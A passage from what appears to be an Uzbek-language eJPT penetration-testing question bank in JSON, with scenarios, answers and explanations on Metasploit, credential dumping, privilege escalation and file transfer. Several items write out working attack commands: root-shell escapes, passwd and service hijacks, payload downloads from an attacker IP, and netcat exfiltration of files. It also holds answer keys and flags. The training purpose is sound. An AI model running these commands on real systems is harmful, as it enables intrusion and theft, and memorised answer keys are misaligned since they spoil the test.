+  "question": "Firewall kiruvchi ulanishlarni bloklagan bo'lsa, qaysi payload ishlaydi?",
+  "options": [
+   "bind_tcp",
+   "reverse_tcp",
+   "Ikkalasi ham",
+   "Hech qaysi"
+  ],
+  "answer": "reverse_tcp",
+  "explanation": "bind_tcp target'da port ochadi (kiruvchi ulanish kerak — bloklangan). reverse_tcp esa target o'zi CHIQIB ulanadi — chiquvchi ruxsat borligi uchun ishlaydi."
+ },
+ {
+  "id": "hnp-042",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "# Ichki host 192.168.20.10 SMB (445) ochiq, ekspluatatsiya kerak\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(...) > set RHOSTS 192.168.20.10\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp",
+  "question": "Pivot orqali ichki hostni ekspluatatsiya qilganda nega ko'pincha bind_tcp payload tanlanadi?",
+  "options": [
+   "Tezroq bo'lgani uchun",
+   "Ichki host Kali'ga to'g'ridan-to'g'ri reverse ulana olmaydi — bind orqali pivot host ulanadi",
+   "reverse_tcp umuman ishlamaydi",
+   "bind_tcp shifrlangan"
+  ],
+  "answer": "Ichki host Kali'ga to'g'ridan-to'g'ri reverse ulana olmaydi — bind orqali pivot host ulanadi",
+  "explanation": "Ichki host Kali'ni ko'rmaydi, shuning uchun reverse qiyin. bind_tcp target'da port ochadi, Metasploit esa autoroute orqali unga ulanadi."
+ },
+ {
+  "id": "hnp-043",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > load kiwi\nLoading extension kiwi...Success.\nmeterpreter > creds_all\n[+] Username : admin  Domain : CORP  NTLM : 5835048ce94ad0564e29a924a03510ef\n[+] Username : admin  Domain : CORP  Password : SummerP@ss2025",
+  "question": "'load kiwi' (Mimikatz) nima qildi?",
+  "options": [
+   "Faqat NTLM hashlarni oldi",
+   "Xotiradan credential (parol/hash)larni chiqarib oldi",
+   "Parolni o'zgartirdi",
+   "Faylni yukladi"
+  ],
+  "answer": "Xotiradan credential (parol/hash)larni chiqarib oldi",
+  "explanation": "kiwi (Mimikatz) LSASS xotirasidan ochiq parol va NTLM hashlarni chiqaradi — bu yerda 'SummerP@ss2025' ham topildi."
+ },
+ {
+  "id": "hnp-044",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > db_nmap -sV 10.10.10.5\n[*] Nmap: 22/tcp open ssh OpenSSH 7.6\nmsf6 > hosts\nmsf6 > services",
+  "question": "'db_nmap' oddiy nmap'dan nimasi bilan farq qiladi?",
+  "options": [
+   "Tezroq skanlaydi",
+   "Natijalarni Metasploit ma'lumotlar bazasiga saqlaydi (hosts/services)",
+   "Faqat UDP skanlaydi",
+   "Firewall'ni chetlab o'tadi"
+  ],
+  "answer": "Natijalarni Metasploit ma'lumotlar bazasiga saqlaydi (hosts/services)",
+  "explanation": "db_nmap natijalarni msf DB'ga yozadi; keyin 'hosts', 'services' bilan ko'rish va modullarda avtomatik ishlatish mumkin."
+ },
+ {
+  "id": "hnp-045",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > search -f user_flag.txt\nFound 1 result...\n    c:\\\\Users\\\\jdoe\\\\Documents\\\\user_flag.txt\nmeterpreter > cat \"c:\\\\Users\\\\jdoe\\\\Documents\\\\user_flag.txt\"\nEJPT{us3r_l3v3l_acc3ss}",
+  "question": "jdoe hujjatlaridagi user flag qiymatini kiriting.",
+  "answer": "EJPT{us3r_l3v3l_acc3ss}",
+  "explanation": "meterpreter search -f bilan fayl topildi va o'qildi: EJPT{us3r_l3v3l_acc3ss}."
+ },
+ {
+  "id": "hnp-046",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp\n# 'windows/meterpreter' (x86) vs 'windows/x64/meterpreter'\nmeterpreter > sysinfo\nArchitecture: x64",
+  "question": "Target x64 bo'lsa, nega x64 payload afzal?",
+  "options": [
+   "Farqi yo'q",
+   "x86 payload x64 tizimda ba'zan beqaror/muvaffaqiyatsiz bo'ladi; x64 mos keladi",
+   "x64 tezroq buzadi",
+   "x86 faqat Linux uchun"
+  ],
+  "answer": "x86 payload x64 tizimda ba'zan beqaror/muvaffaqiyatsiz bo'ladi; x64 mos keladi",
+  "explanation": "Payload arxitekturasi target bilan mos bo'lgani ma'qul; x64 target'da x64 meterpreter barqarorroq (masalan migrate/kiwi to'g'ri ishlaydi)."
+ },
+ {
+  "id": "hnp-047",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "$ searchsploit 'Apache 2.4.49'\n Apache HTTP Server 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.sh\n$ # exploit'ni o'zgartirish kerak: TARGET va LHOST'ni tahrirlash\n$ cp /usr/share/exploitdb/exploits/multiple/webapps/50383.sh .",
+  "question": "eJPT'da ko'p uchraydigan vazifa — public exploit'ni ishlatishdan oldin nima qilinadi?",
+  "options": [
+   "Hech narsa, to'g'ridan-to'g'ri ishlatiladi",
+   "Exploit kodini o'qib, target IP/port/LHOST kabi parametrlarni moslashtirish",
+   "Faqat Metasploit'da ishlatish",
+   "Exploit'ni o'chirish"
+  ],
+  "answer": "Exploit kodini o'qib, target IP/port/LHOST kabi parametrlarni moslashtirish",
+  "explanation": "eJPT 'exploit topish va O'ZGARTIRISH'ni sinaydi — public PoC'lardagi IP, port, shell manzillarini o'z muhitingizga moslash kerak."
+ },
+ {
+  "id": "hnp-048",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "meterpreter > background\nmsf6 exploit(handler) > sessions -u 2\n[*] Upgrading session ID: 2\n[*] Starting exploit/multi/handler\n[*] Sending stage (200262 bytes)\n[*] Meterpreter session 3 opened",
+  "question": "'sessions -u 2' buyrug'i nima qildi?",
+  "options": [
+   "2-sessiyani yopdi",
+   "Oddiy shell sessiyasini (2) to'liq Meterpreter'ga yangiladi (upgrade)",
+   "Yangi target qo'shdi",
+   "Parolni oldi"
+  ],
+  "answer": "Oddiy shell sessiyasini (2) to'liq Meterpreter'ga yangiladi (upgrade)",
+  "explanation": "sessions -u oddiy komanda shell'ni Meterpreter'ga ko'taradi — endi migrate, hashdump kabi funksiyalar mavjud bo'ladi."
+ },
+ {
+  "id": "hna-001",
+  "domain": "host_network_auditing",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "www-data@target:/var/www$ sudo -l\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find",
+  "question": "www-data qaysi binardan foydalanib root'ga ko'tarilishi mumkin? (binar nomini yozing)",
+  "answer": "find",
+  "explanation": "sudo -l 'find' ni NOPASSWD root bilan ruxsat bergan; GTFOBins bo'yicha 'find . -exec /bin/sh \\;' orqali root shell olinadi."
+ },
+ {
+  "id": "hna-002",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/nmap",
+  "question": "Bu buyruq nimani qidiryapti va qaysi natija privesc uchun G'AYRIODDIY?",
+  "options": [
+   "Katta fayllar; /usr/bin/sudo",
+   "SUID bitli fayllar; /usr/bin/nmap (odatda SUID bo'lmaydi)",
+   "Yashirin fayllar; /usr/bin/passwd",
+   "Bo'sh fayllar; /usr/bin/find"
+  ],
+  "answer": "SUID bitli fayllar; /usr/bin/nmap (odatda SUID bo'lmaydi)",
+  "explanation": "-perm -4000 SUID fayllarni topadi. passwd/sudo normal, lekin SUID nmap g'ayrioddiy — eski nmap interactive rejimida root shell beradi (GTFOBins)."
+ },
+ {
+  "id": "hna-003",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "file-transfer"
+  ],
+  "scenario": "# Kali'da:\n$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 ...\n# Target'da:\nwww-data@target$ wget http://10.10.14.5/linpeas.sh -O /tmp/linpeas.sh",
+  "question": "Bu usul nima uchun ishlatilmoqda?",
+  "options": [
+   "Kali'dan target'ga fayl ko'chirish (file transfer)",
+   "Target'ni skanlash",
+   "Parolni buzish",
+   "Portni ochish"
+  ],
+  "answer": "Kali'dan target'ga fayl ko'chirish (file transfer)",
+  "explanation": "Kali'da HTTP server ko'tariladi, target wget bilan faylni (linpeas.sh) yuklab oladi — eng keng tarqalgan file transfer usuli."
+ },
+ {
+  "id": "hna-004",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows",
+   "file-transfer"
+  ],
+  "scenario": "C:\\> certutil -urlcache -f http://10.10.14.5/nc.exe C:\\Windows\\Temp\\nc.exe\n****  Online  ****\nCertUtil: -URLCache command completed successfully.",
+  "question": "Windows'da certutil bu yerda qanday maqsadda ishlatildi?",
+  "options": [
+   "Sertifikatni tekshirish",
+   "Kali'dan fayl (nc.exe) yuklab olish",
+   "Faylni shifrlash",
+   "Xizmatni o'chirish"
+  ],
+  "answer": "Kali'dan fayl (nc.exe) yuklab olish",
+  "explanation": "certutil -urlcache -f — Windows'da o'rnatilgan (LOLBin) vosita orqali HTTP'dan fayl yuklab olish (wget yo'q bo'lganda)."
+ },
+ {
+  "id": "hna-005",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeImpersonatePrivilege        Impersonate a client           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled",
+  "question": "SeImpersonatePrivilege yoqilgan. Bu qanday privesc texnikasiga yo'l ochadi?",
+  "options": [
+   "Kerberoasting",
+   "Potato hujumlari (JuicyPotato/PrintSpoofer) orqali SYSTEM olish",
+   "Pass-the-Hash",
+   "DLL hijacking"
+  ],
+  "answer": "Potato hujumlari (JuicyPotato/PrintSpoofer) orqali SYSTEM olish",
+  "explanation": "SeImpersonatePrivilege — 'Potato' oilasi (JuicyPotato, PrintSpoofer, RoguePotato) uchun klassik vektor; SYSTEM'ga ko'tariladi."
+ },
+ {
+  "id": "hna-006",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "hashcat",
+   "john"
+  ],
+  "scenario": "$ cat hash.txt\n$1$xyz$5J8pM2q...\n$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt\n$1$xyz$5J8pM2q...:Password123",
+  "question": "'$1$' bilan boshlanadigan hash qaysi turdagi va natija nima?",
+  "options": [
+   "NTLM; parol topilmadi",
+   "MD5-crypt (Unix); parol 'Password123'",
+   "bcrypt; parol shifrlangan",
+   "SHA1; parol 'xyz'"
+  ],
+  "answer": "MD5-crypt (Unix); parol 'Password123'",
+  "explanation": "'$1$' — MD5-crypt (Unix). hashcat -m 500 shu turga mos; natija 'Password123' — wordlist bilan buzildi."
+ },
+ {
+  "id": "hna-007",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "john"
+  ],
+  "scenario": "$ unshadow /etc/passwd /etc/shadow > combined.txt\n$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\nbob:S3cr3t99  (bob)\nroot:letmein   (root)",
+  "question": "'unshadow' buyrug'i nima uchun kerak bo'ldi?",
+  "options": [
+   "Shadow faylni o'chirish",
+   "passwd va shadow fayllarni John uchun bitta formatga birlashtirish",
+   "Parolni shifrlash",
+   "Foydalanuvchi yaratish"
+  ],
+  "answer": "passwd va shadow fayllarni John uchun bitta formatga birlashtirish",
+  "explanation": "unshadow /etc/passwd va /etc/shadow ni birlashtiradi; keyin John parollarni buzadi (bob:S3cr3t99, root:letmein)."
+ },
+ {
+  "id": "hna-008",
+  "domain": "host_network_auditing",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "hashcat"
+  ],
+  "scenario": "$ cat ntlm.txt\n31d6cfe0d16ae931b73c59d7e0c089c0\n$ hashcat -m ???? ntlm.txt rockyou.txt\n# Windows NTLM hashni buzmoqchimiz",
+  "question": "Hashcat'da NTLM hash uchun to'g'ri mode (-m) raqamini yozing.",
+  "answer": "1000",
+  "explanation": "Hashcat -m 1000 — NTLM. (Boshqalar: 0=MD5, 500=md5crypt, 1800=sha512crypt, 3200=bcrypt.)"
+ },
+ {
+  "id": "hna-009",
+  "domain": "host_network_auditing",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "www-data@target:/var/www$ sudo -l\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim",
+  "question": "www-data qaysi binardan foydalanib root'ga ko'tarilishi mumkin? (binar nomini yozing)",
+  "answer": "vim",
+  "explanation": "sudo vim -> ':!/bin/sh' yoki ':py import os;os.system(\"/bin/sh\")' orqali root shell (GTFOBins)."
+ },
+ {
+  "id": "hna-010",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ cat /etc/crontab\n# m h dom mon dow user  command\n*/5 *  *   *   *   root  /opt/scripts/backup.sh\nuser@target:~$ ls -la /opt/scripts/backup.sh\n-rwxrwxrwx 1 root root 210 Feb 12 backup.sh",
+  "question": "Bu konfiguratsiya nega privesc imkonini beradi?",
+  "options": [
+   "backup.sh root sifatida ishlaydi va hamma yoza oladi (rwxrwxrwx) — zararli kod qo'shish mumkin",
+   "Cron faqat oddiy foydalanuvchi uchun",
+   "Fayl faqat o'qish uchun",
+   "Hech qanday xavf yo'q"
+  ],
+  "answer": "backup.sh root sifatida ishlaydi va hamma yoza oladi (rwxrwxrwx) — zararli kod qo'shish mumkin",
+  "explanation": "Cron backup.sh ni har 5 daqiqada ROOT sifatida ishlatadi; fayl world-writable (rwxrwxrwx) — unga reverse shell qo'shsangiz root olasiz."
+ },
+ {
+  "id": "hna-011",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ getcap -r / 2>/dev/null\n/usr/bin/python3.8 = cap_setuid+ep",
+  "question": "python3.8 da 'cap_setuid' capability bor. Bu nimani anglatadi?",
+  "options": [
+   "Python ishlamaydi",
+   "Python setuid(0) chaqirib root'ga ko'tarilishi mumkin",
+   "Faqat fayl o'qiydi",
+   "Tarmoqqa ulanadi"
+  ],
+  "answer": "Python setuid(0) chaqirib root'ga ko'tarilishi mumkin",
+  "explanation": "cap_setuid capability python'ga UID o'zgartirish huquqini beradi: python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")' -> root."
+ },
+ {
+  "id": "hna-012",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows",
+   "enumeration"
+  ],
+  "scenario": "C:\\> systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nOS Name:      Microsoft Windows Server 2008 R2 Datacenter\nOS Version:   6.1.7601 Service Pack 1 Build 7601",
+  "question": "Bu ma'lumot keyingi qadam uchun nima uchun muhim?",
+  "options": [
+   "Faqat qiziqish uchun",
+   "OS versiyasi/patch darajasiga mos kernel exploitlarni topish uchun",
+   "Parolni buzish uchun",
+   "Tarmoqni skanlash uchun"
+  ],
+  "answer": "OS versiyasi/patch darajasiga mos kernel exploitlarni topish uchun",
+  "explanation": "systeminfo OS versiyasi va Service Pack'ni beradi; Windows-Exploit-Suggester kabi vosita bilan mos privesc exploitlarni aniqlash mumkin."
+ },
+ {
+  "id": "hna-013",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows",
+   "enumeration"
+  ],
+  "scenario": "C:\\> net user\nUser accounts for \\\\WIN-01\n-------------------------------------------------------------\nAdministrator    Guest    jdoe    svc_sql\nC:\\> net user svc_sql\nLocal Group Memberships  *Administrators",
+  "question": "'net user svc_sql' natijasi nimani ochib berdi?",
+  "options": [
+   "svc_sql oddiy foydalanuvchi",
+   "svc_sql Administrators guruhida — yuqori imtiyozli hisob",
+   "svc_sql o'chirilgan",
+   "svc_sql parolsiz"
+  ],
+  "answer": "svc_sql Administrators guruhida — yuqori imtiyozli hisob",
+  "explanation": "svc_sql 'Local Group Memberships *Administrators' — ya'ni administrator. Uning parolini/hashini olish maqsad bo'ladi."
+ },
+ {
+  "id": "hna-014",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "linux"
+  ],
+  "scenario": "user@target:~$ sudo -l\n(root) NOPASSWD: /bin/cat\nuser@target:~$ sudo cat /root/root.txt\nEJPT{sud0_c4t_r00t_r34d}",
+  "question": "sudo cat orqali o'qilgan flag qiymatini kiriting.",
+  "answer": "EJPT{sud0_c4t_r00t_r34d}",
+  "explanation": "sudo NOPASSWD cat bilan /root/root.txt o'qildi (to'liq root shell shart emas): EJPT{sud0_c4t_r00t_r34d}."
+ },
+ {
+  "id": "hna-015",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\nC:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1",
+  "question": "Ikkala registrda AlwaysInstallElevated=1. Bu nimaga imkon beradi?",
+  "options": [
+   "Hech narsa",
+   "Har qanday .msi paketni SYSTEM huquqi bilan o'rnatish — zararli MSI orqali privesc",
+   "Faqat dastur o'chirish",
+   "Parolni ko'rish"
+  ],
+  "answer": "Har qanday .msi paketni SYSTEM huquqi bilan o'rnatish — zararli MSI orqali privesc",
+  "explanation": "AlwaysInstallElevated (HKLM va HKCU=1) — istalgan MSI SYSTEM sifatida o'rnatiladi; msfvenom -f msi bilan zararli paket -> SYSTEM."
+ },
+ {
+  "id": "hna-016",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"\nService1  C:\\Program Files\\Vuln App\\service.exe   Auto",
+  "question": "Xizmat yo'li 'C:\\Program Files\\Vuln App\\service.exe' qo'shtirnoqsiz. Bu qanday zaiflik?",
+  "options": [
+   "DLL hijacking",
+   "Unquoted Service Path — Windows 'C:\\Program.exe' ni ham izlaydi",
+   "Weak file permission",
+   "Registry autorun"
+  ],
+  "answer": "Unquoted Service Path — Windows 'C:\\Program.exe' ni ham izlaydi",
+  "explanation": "Bo'sh joyli, qo'shtirnoqsiz yo'lda Windows 'C:\\Program.exe' ni birinchi sinaydi; u yerga zararli exe qo'ysangiz xizmat huquqida ishga tushadi."
+ },
+ {
+  "id": "hna-017",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "file-transfer"
+  ],
+  "scenario": "# Target -> Kali (fayl chiqarish)\n# Kali'da:\n$ nc -lvnp 4444 > loot.tar.gz\n# Target'da:\nuser@target$ nc 10.10.14.5 4444 < /tmp/loot.tar.gz",
+  "question": "Bu netcat kombinatsiyasi nima qildi?",
+  "options": [
+   "Target'ga fayl yukladi",
+   "Target'dan Kali'ga fayl (loot.tar.gz) uzatdi (exfiltration)",
+   "Reverse shell ochdi",
+   "Portni skanladi"
+  ],
+  "answer": "Target'dan Kali'ga fayl (loot.tar.gz) uzatdi (exfiltration)",
+  "explanation": "Kali nc listener faylga yozadi (> loot), target nc bilan faylni yuboradi (< loot) — target->Kali file transfer."
+ },
+ {
+  "id": "hna-018",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ id\nuid=1001(user) gid=1001(user) groups=1001(user),4(adm),27(sudo),999(docker)",
+  "question": "Foydalanuvchi qaysi guruh a'zoligi tufayli root'ga ko'tarilishi mumkin?",
+  "options": [
+   "adm",
+   "user",
+   "docker",
+   "sudo (parolsiz bo'lmasa foydasiz)"
+  ],
+  "answer": "docker",
+  "explanation": "'docker' guruhi a'zosi root'ga teng: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh' bilan host root'iga chiqadi."
+ },
+ {
+  "id": "hna-019",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linpeas"
+  ],
+  "scenario": "$ ./linpeas.sh\n...\n[+] Searching passwords in config files\n/var/www/html/config.php:  $db_pass = 'Sup3rDBp@ss';\n[+] Readable /etc/shadow? No",
+  "question": "linPEAS qanday muhim topilmani ko'rsatdi?",
+  "options": [
+   "Ochiq portlar",
+   "config.php ichida ochiq DB paroli 'Sup3rDBp@ss'",
+   "Kernel versiyasi",
+   "SUID fayllar"
+  ],
+  "answer": "config.php ichida ochiq DB paroli 'Sup3rDBp@ss'",
+  "explanation": "linPEAS config fayllardagi parollarni qidiradi; config.php'dagi DB parolini (Sup3rDBp@ss) topdi — parolni qayta ishlatish (reuse) uchun sinab ko'riladi."
+ },
+ {
+  "id": "hna-020",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ ls -la /etc/passwd\n-rw-rw-rw- 1 root root 1420 Feb 12 /etc/passwd\nuser@target:~$ openssl passwd -1 -salt hack pass123\n$1$hack$zData...",
+  "question": "/etc/passwd world-writable. Root olish uchun to'g'ri qadam qaysi?",
+  "options": [
+   "Faylni o'chirish",
+   "Yaratilgan hash bilan yangi UID=0 qatorini /etc/passwd ga qo'shish",
+   "Faqat o'qish",
+   "Parolni almashtirish uchun passwd buyrug'i"
+  ],
+  "answer": "Yaratilgan hash bilan yangi UID=0 qatorini /etc/passwd ga qo'shish",
+  "explanation": "passwd yoziladigan bo'lsa: 'hacker:$1$hack$...:0:0::/root:/bin/bash' qatorini qo'shib, su hacker (pass123) bilan root bo'lasiz."
+ },
+ {
+  "id": "hna-021",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "windows",
+   "enumeration"
+  ],
+  "scenario": "C:\\> whoami /groups | findstr /i \"admin\"\nBUILTIN\\Administrators   Alias   ...   Enabled group, Group owner\nC:\\> whoami /priv | findstr /i Enabled",
+  "question": "Foydalanuvchi Administrators guruhida, lekin cmd oddiy huquqda ochilgan. Sabab ko'pincha nima?",
+  "options": [
+   "Foydalanuvchi admin emas",
+   "UAC (User Account Control) tokenni pasaytirgan — 'Run as administrator' kerak",
+   "Windows buzilgan",
+   "Guruh o'chirilgan"
+  ],
+  "answer": "UAC (User Account Control) tokenni pasaytirgan — 'Run as administrator' kerak",
+  "explanation": "UAC admin foydalanuvchiga ham cheklangan token beradi; to'liq huquq uchun elevated (UAC bypass yoki 'Run as administrator') kerak."
+ },
+ {
+  "id": "hna-022",
+  "domain": "host_network_auditing",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "windows"
+  ],
+  "scenario": "C:\\> reg query HKLM\\SOFTWARE\\App /s\n    AdminPassword    REG_SZ    Wint3r2025!\nC:\\> runas /user:Administrator cmd\n# so'ng flag:\nC:\\Users\\Administrator> type flag.txt\nEJPT{r3g_st0r3d_cr3ds}",
+  "question": "Registrdagi saqlangan parol orqali topilgan flag qiymatini kiriting.",
+  "answer": "EJPT{r3g_st0r3d_cr3ds}",
+  "explanation": "Registrda ochiq saqlangan AdminPassword topildi; runas bilan admin bo'lib flag o'qildi: EJPT{r3g_st0r3d_cr3ds}."
+ },
+ {
+  "id": "hna-023",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ history\n...\n  145  mysql -u root -pRootPass123 -e 'show databases;'\n  146  clear",
+  "question": "bash history nimani oshkor qildi?",
+  "options": [
+   "Hech narsa muhim emas",
+   "MySQL root paroli (RootPass123) buyruqlar tarixida qoldi",
+   "Faqat clear buyrug'i",
+   "SSH kaliti"
+  ],
+  "answer": "MySQL root paroli (RootPass123) buyruqlar tarixida qoldi",
+  "explanation": "~/.bash_history buyruq qatorida yozilgan parollarni saqlaydi; -pRootPass123 oshkor bo'ldi — parolni qayta ishlatish uchun sinab ko'riladi."
+ },
+ {
+  "id": "hna-024",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "linux",
+   "privilege-escalation"
+  ],
+  "scenario": "user@target:~$ uname -a\nLinux target 3.13.0-24-generic #46-Ubuntu x86_64\n$ searchsploit linux kernel 3.13 privilege\nLinux Kernel 3.13 - 'CONFIG_X86_X32' overwrite | linux/local/31347.c\nLinux Kernel 3.13.0 < 3.19 (Ubuntu) - 'overlayfs' | linux/local/37292.c",
+  "question": "Eskirgan kernel (3.13) bilan privesc uchun to'g'ri yo'nalish qaysi?",
+  "options": [
+   "Hech narsa qilib bo'lmaydi",
+   "Kernel versiyasiga mos local exploit (masalan overlayfs 37292) ni kompilyatsiya qilib ishga tushirish",
+   "Faqat sudo -l",
+   "Parolni buzish"
+  ],
+  "answer": "Kernel versiyasiga mos local exploit (masalan overlayfs 37292) ni kompilyatsiya qilib ishga tushirish",
+  "explanation": "Eski kernel (3.13) — mashhur overlayfs/dirtycow kabi local root exploitlar mavjud; kodni target'da gcc bilan kompilyatsiya qilib ishga tushiriladi."
+ },
+ {
+  "id": "hna-025",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "hashcat",
+   "john"
+  ],
+  "scenario": "# eJPT'da tez-tez: hash turini aniqlash\n$ hashid '$2y$10$N9qo8uLOickgx2ZMRZoMy...'\nAnalyzing '$2y$10$...'\n[+] Blowfish(OpenBSD)\n[+] Bcrypt",
+  "question": "'$2y$' bilan boshlanadigan hash qaysi algoritm?",
+  "options": [
+   "MD5",
+   "NTLM",
+   "bcrypt (Blowfish)",
+   "SHA-256"
+  ],
+  "answer": "bcrypt (Blowfish)",
+  "explanation": "$2y$ (yoki $2a$, $2b$) — bcrypt. Sekin va kuchli; hashcat -m 3200. Buzish qiyin, wordlist zarur."
+ },
+ {
+  "id": "hna-026",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "windows",
+   "file-transfer"
+  ],
+  "scenario": "# Kali'da SMB server:\n$ impacket-smbserver share $(pwd) -smb2support\n# Target'da:\nC:\\> copy \\\\10.10.14.5\\share\\mimikatz.exe C:\\Temp\\",
+  "question": "impacket-smbserver bu yerda nima uchun ishlatildi?",
+  "options": [
+   "Parol buzish",
+   "Kali'da SMB share ko'tarib, Windows target'ga/dan fayl ko'chirish",
+   "Portni skanlash",
+   "Xizmatni o'chirish"
+  ],
+  "answer": "Kali'da SMB share ko'tarib, Windows target'ga/dan fayl ko'chirish",
+  "explanation": "impacket-smbserver Kali'da SMB share yaratadi; Windows 'copy \\\\IP\\share\\...' bilan file transfer qiladi (certutil o'rniga)."
+ },
+ {
+  "id": "hna-027",
+  "domain": "host_network_auditing",
+  "type": "direct",
+  "difficulty": "easy",
+  "tools": [
+   "linux",
+   "enumeration"
+  ],
+  "scenario": "user@target:~$ cat /etc/os-release\nNAME=\"Ubuntu\"\nVERSION=\"18.04.4 LTS (Bionic Beaver)\"\nID=ubuntu",
+  "question": "Target qaysi Linux distributivida ishlamoqda? (nomini yozing)",
+  "answer": "Ubuntu",
+  "explanation": "/etc/os-release NAME=\"Ubuntu\" — distributiv Ubuntu 18.04. Enumeration'ning asosiy qadami."
+ },
+ {
+  "id": "hna-028",
+  "domain": "host_network_auditing",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "windows",
+   "privilege-escalation"
+  ],
+  "scenario": "C:\\> accesschk.exe -uwcqv \"Everyone\" *\nRW VulnService\n\tSERVICE_ALL_ACCESS\nC:\\> sc qc VulnService\nBINARY_PATH_NAME : C:\\Apps\\vuln.exe",
+  "question": "'Everyone' guruhi VulnService'ga SERVICE_ALL_ACCESS ega. Bu nimaga imkon beradi?",
+  "options": [
+   "Hech narsa",
+   "Xizmat binar yo'lini (binPath) o'zgartirib, uni zararli exe/buyruqqa yo'naltirib SYSTEM olish",
+   "Faqat xizmatni o'qish",
+   "Parolni ko'rish"
+  ],
+  "answer": "Xizmat binar yo'lini (binPath) o'zgartirib, uni zararli exe/buyruqqa yo'naltirib SYSTEM olish",
+  "explanation": "Weak service permission: 'sc config VulnService binPath= \"cmd /c net user...\"' bilan xizmat SYSTEM sifatida buyruq bajaradi."
+ },
+ {
